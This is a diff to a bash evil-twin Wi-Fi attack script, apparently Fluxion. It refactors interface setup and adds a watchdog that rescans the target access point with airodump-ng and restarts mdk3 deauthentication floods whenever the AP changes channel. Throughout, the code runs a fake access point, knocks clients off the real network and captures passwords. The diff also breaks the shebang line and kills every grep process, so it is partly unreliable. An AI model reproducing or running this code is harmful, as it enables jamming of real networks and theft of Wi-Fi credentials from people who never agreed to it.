@@ -1,10 +1,13 @@
-#!/bin/bash
+!/bin/bash
 
 ########## DEBUG Mode ##########
 if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
     else FLUX_DEBUG=1
 fi
 ################################
+
+#Keep dump file
+KEEP_DUMP=0
 
 ####### preserve network #######
 if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
@@ -382,7 +385,6 @@ if [ ! -d $PASSLOG_PATH ]; then
 fi
 
 
-
 if [ $FLUX_DEBUG != 1 ]; then
         clear; echo ""
                    sleep 0.01 && echo -e "$red "
@@ -577,11 +579,8 @@ fi
 
 }
 
-# Choose Interface
-function setinterface {
-
-  conditional_clear
-        top
+#MySetinferface
+function killIF {
         #unblock interfaces
         rfkill unblock all
 
@@ -590,9 +589,44 @@ function setinterface {
 
         for monkill in ${KILLMONITOR[@]}; do
                 airmon-ng stop $monkill >$flux_output_device
-                echo -n "$monkill, "
+#              echo -n "$monkill, "
+        done
+}
+
+function initIF {
+        readarray -t naggysoftware < <(./lib/airmon/airmon.sh check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
+        WIFIDRIVER=$(./lib/airmon/airmon.sh | grep "$PREWIFI" | awk '{print($(NF-2))}')
+
+        if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
+        rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
+        fi
+
+        if [ $KEEP_NETWORK = 0 ]; then
+
+        for nagger in "${naggysoftware[@]}"; do
+                killall "$nagger" &>$flux_output_device
+        done
+        sleep 0.5
+
+        fi
+
+        if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
+        modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
+        sleep 0.5
+        fi
+
+        # Select Wifi Interface
+        select PREWIFI in $INTERFACES; do
+                break;
         done
 
+        WIFIMONITOR=$(./lib/airmon/airmon.sh start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
+        WIFI_MONITOR=$WIFIMONITOR
+        WIFI=$PREWIFI
+
+}
+
+function selectIF {
         # Create a variable with the list of physical network interfaces
         readarray -t wirelessifaces < <(./lib/airmon/airmon.sh    |grep "-" | cut -d- -f1)
         INTERFACESNUMBER=`./lib/airmon/airmon.sh   | grep -c "-"`
@@ -625,41 +659,8 @@ function setinterface {
 
                 fi
 
-                if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
-                        conditional_clear
-                        top
-                        setinterface
-                fi
 
-                readarray -t naggysoftware < <(./lib/airmon/airmon.sh check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
-                WIFIDRIVER=$(./lib/airmon/airmon.sh | grep "$PREWIFI" | awk '{print($(NF-2))}')
 
-                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
-                rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
-                fi
-
-                if [ $KEEP_NETWORK = 0 ]; then
-
-                for nagger in "${naggysoftware[@]}"; do
-                        killall "$nagger" &>$flux_output_device
-                done
-                sleep 0.5
-
-                fi
-
-                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
-                modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
-                sleep 0.5
-                fi
-
-                # Select Wifi Interface
-                select PREWIFI in $INTERFACES; do
-                        break;
-                done
-
-                WIFIMONITOR=$(./lib/airmon/airmon.sh start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
-                WIFI_MONITOR=$WIFIMONITOR
-                WIFI=$PREWIFI
 
                 #No wireless cards
         else
@@ -668,7 +669,19 @@ function setinterface {
                 sleep 5
                 exitmode
         fi
+}
 
+
+# Choose Interface
+function setinterface {
+        conditional_clear
+        top
+        killIF
+        selectIF
+        if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
+                setinterface
+        fi
+        initIF
         ghost
 }
 
@@ -2046,13 +2059,52 @@ function routear {
 
 }
 
-# Attack
-function attack {
 
+
+#> $DUMP_PATH/monitor_channel.sh
+function gen_monitor {
+> $DUMP_PATH/monitor_channel.sh
+cat << EOF  >> $DUMP_PATH/monitor_channel.sh
+Host_CHAN=$Host_CHAN
+NC=0
+sleep 300
+while true; do
+    grep 'did not acknowledge authentication response' $DUMP_PATH/hostapd.log &>/dev/null
+    if [ \$? -eq 0 ]; then
+        echo dead_wc > $DUMP_PATH/spipe && NC=0
+        sleep 300
+        continue
+    fi
+
+    rm $DUMP_PATH/redump*  2> /dev/null
+    timeout -s SIGKILL 10 airodump-ng $WIFI_MONITOR --bssid $Host_MAC -w $DUMP_PATH/redump 
+    NCH=\`awk -F", "  '/^'$Host_MAC'/{print \$4}' $DUMP_PATH/redump-01.csv 2>/dev/null\`
+    NCH=\${NCH##* }
+    echo NCH:\$NCH, Host_CHAN:\$Host_CHAN
+    if [ -z \$NCH ];then
+        let NC++
+        [ \$NC -eq 6 ] && echo dead_wc > $DUMP_PATH/spipe && NC=0
+        sleep 60
+        continue
+    else NC=0
+    fi
+    if [ \$NCH -gt 0 ] && [ \$NCH -lt 15 ] && [ \$NCH -ne \$Host_CHAN ] 2>/dev/null
+    then
+        Host_CHAN=\$NCH
+        killall mdk3 &> $flux_output_device
+        xterm $HOLD $BOTTOMRIGHT -bg '#000000' -fg '#FF0009' -title 'Deauth all [mdk3]  '$Host_SSID -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c \$Host_CHAN &
+    fi
+    sleep 120
+done
+EOF
+}
+
+#MyAttack
+function MyAttack {
         interfaceroutear=$WIFI
 
-        handshakecheck
         nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
+        routear 
 
         if [ "$fakeapmode" = "hostapd" ]; then
 
@@ -2063,20 +2115,18 @@ function attack {
                 ifconfig $WIFI up
                 sleep 0.4
         fi
-
-
         if [ $fakeapmode = "hostapd" ]; then
                 killall hostapd &> $flux_output_device
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
-                elif [ $fakeapmode = "airbase-ng" ]; then
+                sleep 0.5
+                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e "hostapd  $DUMP_PATH/hostapd.conf |tee $DUMP_PATH/hostapd.log" &
+                
+        elif [ $fakeapmode = "airbase-ng" ]; then
                 killall airbase-ng &> $flux_output_device
                 xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
         fi
-        sleep 5
 
-        routear &
+
         sleep 3
-
 
         killall dhcpd &> $flux_output_device
         fuser -n tcp -k 53 67 80 &> $flux_output_device
@@ -2092,8 +2142,32 @@ function attack {
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
+        mknod $DUMP_PATH/spipe p  2>/dev/null
+}
+
+#monitor WireLessCard
+function monitor_wc {
+    while grep dead_wc $DUMP_PATH/spipe >/dev/null; do
+        OKD=$KEEP_DUMP
+        KEEP_DUMP=1
+        (exitmode >/dev/null)
+        KEEP_DUMP=$OKD
+        killIF
+        selectIF
+        initIF
+        MyAttack
+    done
+}
+
+# Attack
+function attack {
+        handshakecheck
+        MyAttack
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
+        gen_monitor
+        xterm  -title "Monitor Channel" -e bash -i $DUMP_PATH/monitor_channel.sh  &
         conditional_clear
+        monitor_wc &
 
         while true; do
                 top
@@ -2117,7 +2191,7 @@ $general_case_error"; conditional_clear ;;
 
 # Checks the validity of the password
 function handshakecheck {
-
+        > $DUMP_PATH/handcheck
         echo "#!/bin/bash
 
         echo > $DUMP_PATH/data.txt
@@ -2329,6 +2403,8 @@ function matartodo {
         killall lighttpd &>$flux_output_device
         killall dhcpd &>$flux_output_device
         killall xterm &>$flux_output_device
+        killall grep
+        # $DUMP_PATH/redump*
 
 }
 
@@ -2340,9 +2416,9 @@ function NEUTRA {
         if [ ! -d $DUMP_PATH/data ]; then
                 mkdir $DUMP_PATH/data
         fi
+        rm -rf $DUMP_PATH/data/* 2>/dev/null
 
         source $WORK_DIR/lib/site/index | base64 -d > $DUMP_PATH/file.zip
-
         unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
         rm $DUMP_PATH/file.zip &>$flux_output_device
 
